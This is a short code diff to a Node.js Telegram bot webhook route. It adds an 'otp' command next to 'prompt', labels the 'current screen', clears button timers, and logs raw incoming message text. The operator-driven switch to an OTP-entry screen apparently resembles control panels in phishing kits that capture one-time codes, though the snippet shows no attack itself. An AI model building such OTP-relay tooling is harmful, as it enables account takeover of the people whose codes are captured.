@@ -543,6 +543,8 @@ router.post("/telegram-webhook", async (req, res) => {
     if (data.message && !data.callback_query) {
       const chatId = data.message.chat.id;
       const text = data.message.text?.trim();
+      
+      console.log(text);
 
       if (!pendingPrompts.has(chatId)) {
         return res.sendStatus(200); // Not a prompt reply
@@ -621,15 +623,22 @@ router.post("/telegram-webhook", async (req, res) => {
     // ============================================================
     // 🔹 PROMPT COMMAND
     // ============================================================
-    if (command === "prompt") {
+    if (command === "prompt" || command === "otp") {
+    	
+    	
       // Ask immediately
       await axios.post(
         `https://api.telegram.org/bot${botToken}/sendMessage`,
         {
           chat_id: chatId,
-          text: "Enter a number (15 sec)"
+          text: `Enter a number (15 sec)\n\nCurrent Screen: ${command} screen`
         }
-      );
+      ); 
+      
+      if (pendingButtonTimers.has(chatId)) {
+      clearTimeout(pendingButtonTimers.get(chatId));
+      pendingButtonTimers.delete(chatId);
+    }
 
       // Store pending prompt
       pendingPrompts.set(chatId, { userId, messageId });
@@ -644,9 +653,9 @@ router.post("/telegram-webhook", async (req, res) => {
           await axios.post(
             `https://api.telegram.org/bot${botToken}/editMessageText`,
             {
-              chat_id: chatId,
+              chat_id: chatId, 
               message_id: messageId,
-              text: `${message.text}\n\n❌ prompt click: time over`,
+              text: `${message.text}\n\n❌ Enter ${command}: time over`,
               parse_mode: "HTML"
             }
           );
